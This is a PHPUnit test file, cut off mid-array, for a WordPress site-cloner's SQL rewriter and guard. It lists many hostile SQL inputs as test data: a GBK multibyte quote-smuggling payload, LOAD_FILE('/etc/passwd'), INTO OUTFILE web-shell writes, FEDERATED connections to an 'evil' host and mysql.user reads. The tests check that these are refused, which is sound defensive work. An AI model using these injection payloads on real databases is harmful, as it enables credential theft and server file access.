<?php
/**
 * SQL rewriter tests.
 *
 * @package wp-free-site-cloner
 */

/**
 * @covers FSC_SQL_Rewriter
 */
class SqlRewriterTest extends FSC_Test_Case {

	public function test_placeholder_prefix_rewrite() {
		$rw = new FSC_SQL_Rewriter( '{{FSC_PREFIX}}', 'fsctmp_' );
		$r  = $rw->rewrite( "INSERT INTO `{{FSC_PREFIX}}options` (`option_name`) VALUES ('`{{FSC_PREFIX}}options` in data')" );
		$this->assertSame( 'exec', $r['action'] );
		$this->assertSame( "INSERT INTO `fsctmp_options` (`option_name`) VALUES ('`{{FSC_PREFIX}}options` in data')", $r['sql'] );
		$r = $rw->rewrite( 'DROP TABLE IF EXISTS `{{FSC_PREFIX}}posts`' );
		$this->assertSame( 'DROP TABLE IF EXISTS `fsctmp_posts`', $r['sql'] );
	}

	public function test_foreign_prefix_only_in_table_positions() {
		$rw  = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_' );
		$sql = "CREATE TABLE `wp_links` (\n `wp_id` int NOT NULL COMMENT 'REFERENCES `wp_x`',\n `other` int,\n KEY `wp_key` (`wp_id`),\n CONSTRAINT `fk` FOREIGN KEY (`other`) REFERENCES `wp_posts` (`ID`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4";
		$r   = $rw->rewrite( $sql );
		$this->assertSame( 'exec', $r['action'] );
		$this->assertStringStartsWith( 'CREATE TABLE `fsctmp_links`', $r['sql'] );
		$this->assertStringContainsString( '`wp_id` int', $r['sql'] );
		$this->assertStringContainsString( "COMMENT 'REFERENCES `wp_x`'", $r['sql'] );
		$this->assertStringContainsString( 'KEY `wp_key`', $r['sql'] );
		$this->assertStringContainsString( 'REFERENCES `fsctmp_posts` (`ID`)', $r['sql'] );

		$r = $rw->rewrite( "INSERT IGNORE INTO wp_posts VALUES (1,'wp_posts')" );
		$this->assertSame( "INSERT IGNORE INTO `fsctmp_posts` VALUES (1,'wp_posts')", $r['sql'] );
		$r = $rw->rewrite( 'REPLACE INTO `wp_options` VALUES (1)' );
		$this->assertSame( 'REPLACE INTO `fsctmp_options` VALUES (1)', $r['sql'] );
		$r = $rw->rewrite( 'DROP TABLE IF EXISTS `wp_a`, wp_b' );
		$this->assertSame( 'DROP TABLE IF EXISTS `fsctmp_a`, `fsctmp_b`', $r['sql'] );
		$r = $rw->rewrite( 'ALTER TABLE `wp_posts` ADD PRIMARY KEY (`ID`)' );
		$this->assertSame( 'ALTER TABLE `fsctmp_posts` ADD PRIMARY KEY (`ID`)', $r['sql'] );
	}

	public function test_dangerous_or_foreign_statements_are_skipped() {
		$rw   = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_' );
		$skip = array(
			'DROP TABLE `users`',
			'DROP TABLE wp_a, users',
			'INSERT INTO `other_table` VALUES (1)',
			'INSERT INTO `db`.`wp_posts` VALUES (1)',
			'DROP DATABASE wp',
			'CREATE USER x',
			"GRANT ALL ON *.* TO 'x'",
			'USE otherdb',
			'LOCK TABLES `wp_posts` WRITE',
			'UNLOCK TABLES',
			'ALTER TABLE `wp_posts` RENAME TO `live_posts`',
			'ALTER TABLE `wp_posts` RENAME `x`',
			"SELECT * INTO OUTFILE '/tmp/x' FROM wp_users",
			'/*!40000 ALTER TABLE `wp_posts` DISABLE KEYS */',
			'SET GLOBAL max_connections = 1',
			'SET FOREIGN_KEY_CHECKS=0',
			'CREATE TABLE `wp_x` LIKE `wp_users`',
			'CREATE TABLE `wp_x` SELECT * FROM mysql.user',
			'INSERT INTO `wp_x` SELECT * FROM mysql.user',
			'CREATE DEFINER=`root`@`localhost` TRIGGER t BEFORE INSERT ON wp_posts FOR EACH ROW SET @a=1',
			'CREATE ALGORITHM=UNDEFINED VIEW `wp_v` AS SELECT 1',
			'CREATE TABLE `wp_fk` (`a` int, FOREIGN KEY (`a`) REFERENCES `users` (`id`))',
		);
		foreach ( $skip as $sql ) {
			$this->assertSame( 'skip', $rw->rewrite( $sql )['action'], $sql );
		}
		$this->assertSame( 'exec', $rw->rewrite( "ALTER TABLE `wp_posts` COMMENT 'rename me'" )['action'] );
	}

	public function test_set_names() {
		$rw = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_', array( 'utf8_general_ci' => 'utf8', 'latin1_swedish_ci' => 'latin1' ) );
		$r  = $rw->rewrite( '/*!40101 SET NAMES utf8mb4 */' );
		$this->assertSame( 'names', $r['action'] );
		$this->assertSame( 'utf8', $r['charset'] );
		$this->assertTrue( $r['allowed'] );
		$this->assertSame( 'latin1', $rw->rewrite( "SET NAMES 'latin1' COLLATE 'latin1_swedish_ci'" )['charset'] );
		$this->assertTrue( $rw->rewrite( "SET NAMES 'latin1'" )['allowed'] );
		$this->assertSame( 'skip', $rw->rewrite( 'SET NAMES utf8; DROP TABLE x' )['action'] );
	}

	public function test_set_names_charset_allowlist() {
		$rw = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_' );

		// The bypass payload: under a multibyte charset the server ends
		// the string at a quote the plugin's lexer reads as escaped, so a live
		// subquery hides inside what the guard sees as one string literal.
		$payload = "INSERT INTO `wp_options` VALUES (1,'x" . chr( 0xbf ) . "\\',(SELECT user_pass FROM wp2_users LIMIT 1))-- ')";

		// The payload itself is accepted by the guard (the plugin lexes it as one
		// string literal) - the defence is refusing the charset that makes the
		// server disagree, so the whole import stops before it runs.
		$this->assertSame( 'exec', $rw->rewrite( $payload )['action'] );

		foreach ( array( 'gbk', 'big5', 'sjis', 'cp932', 'gb18030' ) as $cs ) {
			foreach ( array( "SET NAMES $cs", "SET NAMES '$cs'", "SET NAMES `$cs`", strtoupper( "set names $cs" ), "/*!40101 SET NAMES $cs */", "SET NAMES $cs COLLATE {$cs}_bin" ) as $stmt ) {
				$r = $rw->rewrite( $stmt );
				$this->assertSame( 'names', $r['action'], $stmt );
				$this->assertFalse( $r['allowed'], $stmt );
				$this->assertSame( $cs, $r['charset'], $stmt );
			}
			$this->assertFalse( FSC_SQL_Rewriter::charset_allowed( $cs ), $cs );
			$this->assertFalse( FSC_SQL_Rewriter::charset_allowed( strtoupper( $cs ) ), $cs );
		}

		// Charsets that cannot be a client connection charset are refused too.
		foreach ( array( 'ucs2', 'utf16', 'utf16le', 'utf32' ) as $cs ) {
			$this->assertFalse( FSC_SQL_Rewriter::charset_allowed( $cs ), $cs );
			$this->assertFalse( $rw->rewrite( "SET NAMES $cs" )['allowed'], $cs );
		}

		// Safe charsets (utf8 family, latin*, ascii, binary and the other
		// single-byte charsets) keep working.
		foreach ( array( 'utf8mb4', 'utf8mb3', 'utf8', 'latin1', 'latin2', 'ascii', 'binary', 'cp1250', 'cp1251', 'cp1256', 'cp1257', 'koi8r', 'koi8u', 'greek', 'hebrew', 'tis620', 'swe7' ) as $cs ) {
			$this->assertTrue( FSC_SQL_Rewriter::charset_allowed( $cs ), $cs );
			$r = $rw->rewrite( "SET NAMES $cs" );
			$this->assertSame( 'names', $r['action'], $cs );
			$this->assertTrue( $r['allowed'], $cs );
		}

		// SET CHARACTER SET / SET character_set_client are not SET NAMES: they
		// are skipped (never applied), so the connection stays on a safe charset.
		$this->assertSame( 'skip', $rw->rewrite( 'SET CHARACTER SET gbk' )['action'] );
		$this->assertSame( 'skip', $rw->rewrite( 'SET character_set_client = gbk' )['action'] );
		$this->assertSame( 'skip', $rw->rewrite( '/*!40101 SET character_set_client = gbk */' )['action'] );
	}

	public function test_collation_fallback_chain() {
		$sql = 'CREATE TABLE `wp_t` (`a` varchar(10) COLLATE utf8mb4_0900_ai_ci, `b` text CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci) ENGINE=Aria DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci PAGE_CHECKSUM=1';

		$mariadb = new FSC_SQL_Rewriter(
			'wp_',
			'fsctmp_',
			array(
				'utf8mb4_unicode_520_ci' => 'utf8mb4',
				'utf8mb4_unicode_ci'     => 'utf8mb4',
				'utf8mb4_general_ci'     => 'utf8mb4',
				'utf8mb3_unicode_ci'     => 'utf8mb3',
				'utf8_unicode_ci'        => 'utf8',
			),
			array( 'InnoDB', 'MyISAM', 'Aria' )
		);
		$r = $mariadb->rewrite( $sql );
		$this->assertStringNotContainsString( '0900', $r['sql'] );
		$this->assertStringContainsString( 'COLLATE utf8mb4_unicode_520_ci', $r['sql'] );
		$this->assertStringContainsString( 'COLLATE=utf8mb4_unicode_520_ci', $r['sql'] );
		$this->assertStringContainsString( 'ENGINE=Aria', $r['sql'] );

		$no520 = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_', array( 'utf8mb4_unicode_ci' => 'utf8mb4', 'utf8_unicode_ci' => 'utf8' ), array( 'InnoDB' ) );
		$r     = $no520->rewrite( $sql );
		$this->assertStringContainsString( 'COLLATE utf8mb4_unicode_ci', $r['sql'] );
		$this->assertStringContainsString( 'CHARACTER SET utf8 COLLATE utf8_unicode_ci', $r['sql'] );
		$this->assertStringContainsString( 'ENGINE=InnoDB', $r['sql'] );

		$old = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_', array( 'utf8_general_ci' => 'utf8', 'utf8_unicode_ci' => 'utf8' ), array( 'InnoDB' ) );
		$r   = $old->rewrite( $sql );
		$this->assertStringNotContainsString( 'utf8mb4', $r['sql'] );
		$this->assertStringContainsString( 'DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci', $r['sql'] );

		// Unknown capabilities: nothing changes up front, the retry downgrades and strips options.
		$unknown = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_' );
		$r       = $unknown->rewrite( $sql );
		$this->assertStringContainsString( 'utf8mb4_0900_ai_ci', $r['sql'] );
		$retry = $unknown->retry_rewrite( $r['sql'] );
		$this->assertStringNotContainsString( '0900', $retry );
		$this->assertStringContainsString( 'utf8mb4_unicode_520_ci', $retry );
		$this->assertStringNotContainsString( 'PAGE_CHECKSUM', $retry );
		$this->assertStringContainsString( 'ENGINE=InnoDB', $retry );
		$this->assertSame( "INSERT INTO `fsctmp_t` VALUES ('utf8mb4_0900_ai_ci')", $unknown->retry_rewrite( "INSERT INTO `fsctmp_t` VALUES ('utf8mb4_0900_ai_ci')" ) );
	}

	public function test_definer_is_stripped() {
		$rw = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_' );
		$this->assertSame( 'ALTER TABLE `fsctmp_a` COMMENT \'x\'', $rw->rewrite( "ALTER TABLE `wp_a` DEFINER=`root`@`%` COMMENT 'x'" )['sql'] );
	}

	public function test_outside_strings() {
		$out = FSC_SQL_Rewriter::outside_strings(
			"a 'a\\'a' \"a\" `a` a",
			function ( $p ) {
				return str_replace( 'a', 'b', $p );
			},
			true
		);
		$this->assertSame( "b 'a\\'a' \"a\" `a` b", $out );
	}

	public function test_servmask_placeholder_tables_and_keys() {
		$rw = new FSC_SQL_Rewriter( 'SERVMASK_PREFIX_', 'fsctmp_' );
		$rw->set_key_placeholder( 'SERVMASK_PREFIX_', 'wp_' );

		$this->assertSame( 'DROP TABLE IF EXISTS `fsctmp_options`', $rw->rewrite( 'DROP TABLE IF EXISTS `SERVMASK_PREFIX_options`' )['sql'] );
		$r = $rw->rewrite( "CREATE TABLE `SERVMASK_PREFIX_usermeta` (\n `meta_key` varchar(255) DEFAULT 'SERVMASK_PREFIX_x'\n) ENGINE=InnoDB" );
		$this->assertStringStartsWith( 'CREATE TABLE `fsctmp_usermeta`', $r['sql'] );
		$this->assertStringContainsString( "DEFAULT 'SERVMASK_PREFIX_x'", $r['sql'] );

		// Option names and user meta keys: placeholder at the start of a value is restored.
		$r = $rw->rewrite( "INSERT INTO `SERVMASK_PREFIX_options` VALUES (103,'SERVMASK_PREFIX_user_roles','a:1:{s:13:\\\"administrator\\\";s:16:\\\"SERVMASK_PREFIX_\\\";}','yes')" );
		$this->assertSame( "INSERT INTO `fsctmp_options` VALUES (103,'wp_user_roles','a:1:{s:13:\\\"administrator\\\";s:16:\\\"SERVMASK_PREFIX_\\\";}','yes')", $r['sql'] );
		$r = $rw->rewrite( "INSERT INTO `SERVMASK_PREFIX_options` VALUES (100,'SERVMASK_PREFIX_attachment_pages_enabled','0','on'),(101,'wp_notes_notify','1','on')" );
		$this->assertSame( "INSERT INTO `fsctmp_options` VALUES (100,'wp_attachment_pages_enabled','0','on'),(101,'wp_notes_notify','1','on')", $r['sql'] );
		$r = $rw->rewrite( "INSERT INTO `SERVMASK_PREFIX_usermeta` VALUES (13,1,'SERVMASK_PREFIX_capabilities','a:1:{s:13:\"administrator\";b:1;}'),(14,1,\"SERVMASK_PREFIX_user_level\",'10')" );
		$this->assertSame( "INSERT INTO `fsctmp_usermeta` VALUES (13,1,'wp_capabilities','a:1:{s:13:\"administrator\";b:1;}'),(14,1,\"wp_user_level\",'10')", $r['sql'] );
		// A quote inside a value does not shift the literal boundaries.
		$r = $rw->rewrite( "INSERT INTO `SERVMASK_PREFIX_usermeta` VALUES (15,1,'it\\'s','SERVMASK_PREFIX_ in value'),(16,1,'SERVMASK_PREFIX_a','')" );
		$this->assertSame( "INSERT INTO `fsctmp_usermeta` VALUES (15,1,'it\\'s','wp_ in value'),(16,1,'wp_a','')", $r['sql'] );

		// Other tables keep the placeholder text untouched.
		$r = $rw->rewrite( "INSERT INTO `SERVMASK_PREFIX_posts` VALUES (1,'SERVMASK_PREFIX_in_post')" );
		$this->assertSame( "INSERT INTO `fsctmp_posts` VALUES (1,'SERVMASK_PREFIX_in_post')", $r['sql'] );

		// Without the placeholder setting nothing but table names changes.
		$plain = new FSC_SQL_Rewriter( 'SERVMASK_PREFIX_', 'fsctmp_' );
		$this->assertSame( "INSERT INTO `fsctmp_options` VALUES (1,'SERVMASK_PREFIX_user_roles')", $plain->rewrite( "INSERT INTO `SERVMASK_PREFIX_options` VALUES (1,'SERVMASK_PREFIX_user_roles')" )['sql'] );
		$this->assertSame( 'skip', $plain->rewrite( 'START TRANSACTION' )['action'] );
		$this->assertSame( 'skip', $plain->rewrite( 'COMMIT' )['action'] );
		$this->assertSame( 'skip', $plain->rewrite( 'INSERT INTO `wp_options` VALUES (1)' )['action'] );
	}

	public function test_duplicator_dialect() {
		$dump = "/* DUPLICATOR-PRO (PHP MULTI-THREADED BUILD MODE) MYSQL SCRIPT CREATED ON : 2026-09-30 14:46:59 */\n\n"
			. "/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;\n"
			. "/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;\n\n"
			. "CREATE TABLE IF NOT EXISTS `wp_usermeta` (\n  `umeta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,\n  `meta_key` varchar(255) DEFAULT NULL,\n  PRIMARY KEY (`umeta_id`),\n  KEY `meta_key` (`meta_key`(191))\n) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci;\n\n"
			. "/***** TABLE CREATION END *****/\n"
			. "INSERT IGNORE INTO `wp_usermeta` VALUES \n(\"13\",\"1\",\"wp_capabilities\",\"a:1:{s:13:\\\"administrator\\\";b:1;}\"),\n(\"14\",\"1\",\"wp_user_level\",\"10\"),\n(\"15\",\"1\",\"note\",\"a;b; \\\"wp_users\\\" -- not a comment\\n/* nor this */\");\n\n"
			. "INSERT IGNORE INTO `wp_options` VALUES \n(\"100\",\"wp_attachment_pages_enabled\",\"0\",\"on\");\n\n"
			. "/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;\n"
			. "/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;\n\n"
			. "/* Duplicator WordPress Timestamp: 2026-09-30 14:47:00*/\n/* DUPLICATOR_MYSQLDUMP_EOF */\n";
		$file = $this->dir . '/dup.sql';
		file_put_contents( $file, $dump );
		$reader = new FSC_SQL_Reader( $file );
		$rw     = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_' );
		$exec   = array();
		$skip   = 0;
		while ( null !== ( $stmt = $reader->next() ) ) {
			$r = $rw->rewrite( $stmt );
			if ( 'exec' === $r['action'] ) {
				$exec[] = $r['sql'];
			} else {
				$this->assertSame( 'skip', $r['action'] );
				$this->assertSame( 'executable comment', $r['reason'] );
				++$skip;
			}
		}
		$this->assertSame( 4, $skip );
		$this->assertCount( 3, $exec );
		$this->assertStringStartsWith( 'CREATE TABLE IF NOT EXISTS `fsctmp_usermeta` (', $exec[0] );
		$this->assertStringContainsString( 'KEY `meta_key` (`meta_key`(191))', $exec[0] );
		$this->assertStringContainsString( 'COLLATE=utf8mb4_unicode_520_ci', $exec[0] );
		// Only the table name is rewritten; prefixed values stay literal (renamed later on the temp tables).
		$this->assertSame( "INSERT IGNORE INTO `fsctmp_usermeta` VALUES \n(\"13\",\"1\",\"wp_capabilities\",\"a:1:{s:13:\\\"administrator\\\";b:1;}\"),\n(\"14\",\"1\",\"wp_user_level\",\"10\"),\n(\"15\",\"1\",\"note\",\"a;b; \\\"wp_users\\\" -- not a comment\\n/* nor this */\")", $exec[1] );
		$this->assertSame( "INSERT IGNORE INTO `fsctmp_options` VALUES \n(\"100\",\"wp_attachment_pages_enabled\",\"0\",\"on\")", $exec[2] );
	}

	public function test_statements_cannot_reach_beyond_temp_tables() {
		$rw = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_', null, array( 'InnoDB', 'MyISAM', 'MRG_MyISAM', 'FEDERATED', 'CONNECT', 'Aria' ) );
		// Engines outside the allowlist become InnoDB; options that reach other tables/servers/files skip the statement.
		$r = $rw->rewrite( 'CREATE TABLE `wp_m` (`a` int) ENGINE=MRG_MyISAM' );
		$this->assertSame( 'exec', $r['action'] );
		$this->assertStringContainsString( 'ENGINE=InnoDB', $r['sql'] );
		$r = $rw->rewrite( 'CREATE TABLE `wp_m` (`a` int) ENGINE=MRG_MyISAM UNION=(`wp_users`) INSERT_METHOD=LAST' );
		$this->assertSame( 'skip', $r['action'] );
		$r = $rw->rewrite( "CREATE TABLE `wp_f` (`a` int) ENGINE=FEDERATED CONNECTION='mysql://u:p@evil/db/t'" );
		$this->assertSame( 'skip', $r['action'] );
		$r = $rw->rewrite( "CREATE TABLE `wp_c` (`a` int) ENGINE = CONNECT TABLE_TYPE=CSV FILE_NAME='/etc/passwd'" );
		$this->assertSame( 'skip', $r['action'] );
		$r = $rw->rewrite( "CREATE TABLE `wp_a` (`a` int) ENGINE=Aria DEFAULT CHARSET=utf8mb4" );
		$this->assertStringContainsString( 'ENGINE=Aria', $r['sql'] );

		$r = $rw->rewrite( "CREATE TABLE `wp_d` (`a` int, `b` varchar(9) DEFAULT 'DATA DIRECTORY') ENGINE=MyISAM DATA DIRECTORY = '/var/www/html' INDEX DIRECTORY='/tmp/x' COMMENT 'keep'" );
		$this->assertSame( 'exec', $r['action'] );
		$this->assertStringNotContainsString( '/var/www/html', $r['sql'] );
		$this->assertStringNotContainsString( '/tmp/x', $r['sql'] );
		$this->assertStringContainsString( "DEFAULT 'DATA DIRECTORY'", $r['sql'] );
		$this->assertStringContainsString( "COMMENT 'keep'", $r['sql'] );
		$r = $rw->rewrite( "CREATE TABLE `wp_p` (`a` int) PARTITION BY HASH(a) (PARTITION p0 DATA DIRECTORY '/srv/x')" );
		$this->assertStringNotContainsString( '/srv/x', $r['sql'] );

		$r = $rw->rewrite( 'ALTER TABLE `wp_p` EXCHANGE PARTITION p0 WITH TABLE `wp_users`' );
		$this->assertSame( 'skip', $r['action'] );
		$r = $rw->rewrite( 'ALTER TABLE `wp_p` RENAME TO `wp_users`' );
		$this->assertSame( 'skip', $r['action'] );
		$r = $rw->rewrite( 'INSERT INTO `wp_p` SELECT * FROM `wp_users`' );
		$this->assertSame( 'skip', $r['action'] );
		$r = $rw->rewrite( 'CREATE TABLE `wp_x` AS SELECT * FROM `wp_users`' );
		$this->assertSame( 'skip', $r['action'] );
		foreach ( array( 'CREATE TRIGGER t BEFORE INSERT ON wp_posts FOR EACH ROW SET @a=1', 'LOAD DATA INFILE "/etc/passwd" INTO TABLE wp_x', 'SELECT 1 INTO OUTFILE "/var/www/html/x.php"', 'GRANT ALL ON *.* TO x', 'DELETE FROM wp_users', 'UPDATE wp_users SET user_pass=1', 'CREATE TABLE `other`.`wp_x` (a int)', 'DROP TABLE `wp_x`, `live_users`', 'DROP DATABASE wordpress' ) as $sql ) {
			$this->assertSame( 'skip', $rw->rewrite( $sql )['action'], $sql );
		}
	}

	/**
	 * Rewriter that knows every dangerous engine, so only the allowlist protects.
	 *
	 * @return FSC_SQL_Rewriter
	 */
	private static function permissive() {
		return new FSC_SQL_Rewriter( 'wp_', 'fsctmp_', null, array( 'InnoDB', 'MyISAM', 'Aria', 'MRG_MyISAM', 'MERGE', 'FEDERATED', 'CONNECT', 'SPIDER', 'MEMORY', 'CSV', 'ARCHIVE', 'BLACKHOLE', 'SEQUENCE' ) );
	}

	public function test_m1_engine_clause_forms_are_normalised() {
		$rw    = self::permissive();
		$forms = array(
			'ENGINE FEDERATED',
			'ENGINE=FEDERATED',
			'ENGINE = FEDERATED',
			'ENGINE=`FEDERATED`',
			'ENGINE `FEDERATED`',
			"ENGINE='CONNECT'",
			"ENGINE 'CONNECT'",
			'ENGINE="SPIDER"',
			'engine=merge',
			'ENGINE=MEMORY',
			'ENGINE=CSV',
			'ENGINE=BLACKHOLE',
			'ENGINE=ARCHIVE',
			'/*!50100 ENGINE=FEDERATED */',
			'/*!50100 ENGINE FEDERATED */',
			"/*M!100100 ENGINE 'CONNECT' */",
			'/*!ENGINE=`MRG_MyISAM`*/',
		);
		foreach ( $forms as $f ) {
			$r = $rw->rewrite( 'CREATE TABLE `wp_x` (`a` int) ' . $f . ' DEFAULT CHARSET=utf8mb4' );
			$this->assertSame( 'exec', $r['action'], $f );
			$this->assertMatchesRegularExpression( '/ENGINE=InnoDB/', $r['sql'], $f );
			$this->assertDoesNotMatchRegularExpression( '/FEDERATED|CONNECT|SPIDER|merge|MRG|MEMORY|CSV|BLACKHOLE|ARCHIVE/i', $r['sql'], $f );
			$this->assertSame( '', FSC_SQL_Rewriter::guard( 'create', substr( $r['sql'], strlen( 'CREATE TABLE `fsctmp_x`' ) ) ), $f );
		}
		// Partition-level engines too.
		$r = $rw->rewrite( 'CREATE TABLE `wp_x` (`a` int) ENGINE=InnoDB /*!50100 PARTITION BY HASH (`a`) (PARTITION p0 ENGINE = FEDERATED, PARTITION p1 STORAGE ENGINE `CONNECT`) */' );
		$this->assertSame( 'exec', $r['action'] );
		$this->assertSame( 3, substr_count( $r['sql'], 'ENGINE=InnoDB' ) );
		// Allowlisted engines stay as written; Aria is downgraded only in retry mode.
		$this->assertStringContainsString( 'ENGINE=MyISAM', $rw->rewrite( 'CREATE TABLE `wp_x` (`a` int) ENGINE MyISAM' )['sql'] );
		$this->assertStringContainsString( 'ENGINE=Aria', $rw->rewrite( 'CREATE TABLE `wp_x` (`a` int) ENGINE=Aria' )['sql'] );
		$this->assertStringContainsString( 'ENGINE=InnoDB', $rw->retry_rewrite( 'CREATE TABLE `fsctmp_x` (`a` int) ENGINE=Aria' ) );
		// An engine the server lacks becomes InnoDB.
		$inno = new FSC_SQL_Rewriter( 'wp_', 'fsctmp_', null, array( 'InnoDB' ) );
		$this->assertStringContainsString( 'ENGINE=InnoDB', $inno->rewrite( 'CREATE TABLE `wp_x` (`a` int) ENGINE=MyISAM' )['sql'] );
		// The word ENGINE inside strings and plain comments is data.
		$r = $rw->rewrite( "CREATE TABLE `wp_x` (`a` enum('engine','x') COMMENT 'search ENGINE FEDERATED' /* ENGINE CONNECT */) ENGINE=InnoDB" );
		$this->assertSame( 'exec', $r['action'] );
		$this->assertStringContainsString( "COMMENT 'search ENGINE FEDERATED'", $r['sql'] );
		$this->assertStringContainsString( "enum('engine','x')", $r['sql'] );
		$this->assertSame( 'exec', $rw->rewrite( 'ALTER TABLE `wp_x` ENGINE FEDERATED' )['action'] );
		$this->assertStringContainsString( 'ENGINE=InnoDB', $rw->rewrite( 'ALTER TABLE `wp_x` ENGINE FEDERATED' )['sql'] );
	}

	public function test_m1_guard_rejects_engines_that_survive_rewriting() {
		$this->assertSame( 'engine not allowed', FSC_SQL_Rewriter::guard( 'create', ' (`a` int) ENGINE FEDERATED' ) );
		$this->assertSame( 'engine not allowed', FSC_SQL_Rewriter::guard( 'create', " (`a` int) /*!50100 ENGINE 'CONNECT' */" ) );
		$this->assertSame( 'engine not allowed', FSC_SQL_Rewriter::guard( 'alter', ' ENGINE=`MRG_MyISAM`' ) );
		$this->assertSame( 'invalid ENGINE clause', FSC_SQL_Rewriter::guard( 'create', ' (`a` int) ENGINE=' ) );
		$this->assertSame( '', FSC_SQL_Rewriter::guard( 'create', " (`a` int) ENGINE='InnoDB'" ) );
	}

	public function test_m1_table_options_reaching_outside_skip_the_statement() {
		$rw   = self::permissive();
		$skip = array(
			"CREATE TABLE `wp_f` (`a` int) ENGINE=InnoDB CONNECTION='mysql://u:p@evil:3306/db/t'",
			"CREATE TABLE `wp_f` (`a` int) CONNECTION 'srv'",
			"CREATE TABLE `wp_f` (`a` int) /*!50100 CONNECTION='mysql://evil/db/t' */",
			'CREATE TABLE `wp_m` (`a` int) UNION=(`wp_users`)',
			'CREATE TABLE `wp_m` (`a` int) UNION (`users`)',
			'CREATE TABLE `wp_m` (`a` int) INSERT_METHOD=LAST',
			"CREATE TABLE `wp_c` (`a` int) FILE_NAME='/etc/passwd'",
			'CREATE TABLE `wp_c` (`a` int) TABLE_TYPE=CSV',
			"CREATE TABLE `wp_c` (`a` int) SRCDEF='select * from mysql.user'",
			"CREATE TABLE `wp_c` (`a` int) DBNAME='mysql' TABNAME='user'",
			"CREATE TABLE `wp_c` (`a` int) OPTION_LIST='user=root'",
			'CREATE TABLE `wp_c` (`a` int) SECONDARY_ENGINE=RAPID',
			"ALTER TABLE `wp_c` CONNECTION='mysql://evil/db/t'",
			'ALTER TABLE `wp_c` UNION=(`wp_users`)',
			'ALTER TABLE `wp_c` DISCARD TABLESPACE',
			'ALTER TABLE `wp_c` IMPORT TABLESPACE',
			"CREATE TABLE `wp_d` (`a` int) /*!50100 DATA DIRECTORY */ = '/tmp'",
		);
		foreach ( $skip as $sql ) {
			$r = $rw->rewrite( $sql );
			$this->assertSame( 'skip', $r['action'], $sql );
			$this->assertNotSame( '', $r['reason'], $sql );
		}
		// The option names inside strings are data.
		$r = $rw->rewrite( "CREATE TABLE `wp_ok` (`a` varchar(20) DEFAULT 'CONNECTION=x' COMMENT 'UNION INSERT_METHOD FILE_NAME') ENGINE=InnoDB" );
		$this->assertSame( 'exec', $r['action'] );
	}

	public function test_l2_value_expressions_are_restricted() {
		$rw   = self::permissive();
		$skip = array(
			"INSERT INTO `wp_options` VALUES (1,(SELECT user_pass FROM wp_users LIMIT 1),'x')",
			"INSERT INTO `wp_options` VALUES (1,( select 1 ),'x')",
			"INSERT INTO `wp_options` VALUES (1,LOAD_FILE('/etc/passwd'),'x')",
			"INSERT INTO `wp_options` VALUES (1,load_file /* c */ ('/etc/passwd'),'x')",
			"INSERT INTO `wp_options` VALUES (1,SLEEP(999),'x')",
			"INSERT INTO `wp_options` VALUES (1,BENCHMARK(100000000,MD5('a')),'x')",
			"INSERT INTO `wp_options` VALUES (1,GET_LOCK('a',100),'x')",
			"INSERT INTO `wp_options` VALUES (1,sys_exec('id'),'x')",
			"INSERT INTO `wp_options` VALUES (1,@@datadir,'x')",
			"INSERT INTO `wp_options` VALUES (1,@a,'x')",
			"INSERT INTO `wp_options` VALUES (1,`otherdb`.`t`,'x')",
			"INSERT INTO `wp_options` VALUES (1,otherdb.t.c,'x')",
			"INSERT INTO `wp_options` VALUES (1,`otherdb` . `t`,'x')",
			"INSERT INTO `wp_options` VALUES (1,otherdb .5t,'x')",
			"INSERT INTO `wp_options` VALUES (1,'a','b') -- x\n, (SLEEP(1),2,3)",
			"INSERT INTO `wp_options` VALUES (1,(TABLE `wp_users` LIMIT 1),'x')",
			"INSERT INTO `wp_options` VALUES (1,NEXTVAL(seq),'x')",
			"INSERT INTO `wp_options` VALUES (1,'a','b') ON DUPLICATE KEY UPDATE option_value = (SELECT user_pass FROM wp_users LIMIT 1)",
			"INSERT INTO `wp_options` VALUES (1,'a','b') ON DUPLICATE KEY UPDATE option_value = LOAD_FILE('/etc/passwd')",
			"INSERT INTO `wp_options` VALUES (1,'a','b') ON DUPLICATE KEY UPDATE option_value = `mysql`.`user`.`authentication_string`",
			"INSERT INTO `wp_options` SET option_value = (SELECT 1)",
			"INSERT INTO `wp_options` VALUES (1,'a','b') /*!50000 , (2, LOAD_FILE('/etc/passwd'), 'c') */",
			"INSERT INTO `wp_options` VALUES (1,'it''s',SLEEP(1))",
			"INSERT INTO `wp_options` VALUES (1,'a\\\\',SLEEP(1))",
			"INSERT INTO `wp_options` VALUES (1,'a' /* ' */,SLEEP(1) /* ' */)",
			"INSERT INTO `wp_options` VALUES (1,'unterminated)",
			"INSERT INTO `wp_options` VALUES (1,2) INTO OUTFILE '/var/www/html/x.php'",
			"REPLACE INTO `wp_options` VALUES (1,(SELECT 2))",
			"CREATE TABLE `wp_x` (`a` int DEFAULT (SLEEP(5)))",
			"CREATE TABLE `wp_x` (`a` text DEFAULT (LOAD_FILE('/etc/passwd')))",
			'CREATE TABLE `wp_x` (`a` int, `b` int GENERATED ALWAYS AS ((SELECT 1)) VIRTUAL)',
			'CREATE TABLE `wp_x` (`a` int, `b` int AS (BENCHMARK(1e9, 1)) STORED)',
			'CREATE TABLE `wp_x` (`a` int CHECK (`a` > (SELECT COUNT(*) FROM `wp_users`)))',
			'CREATE TABLE `wp_x` (`a` int, CONSTRAINT `c` CHECK (SLEEP(1) = 0))',
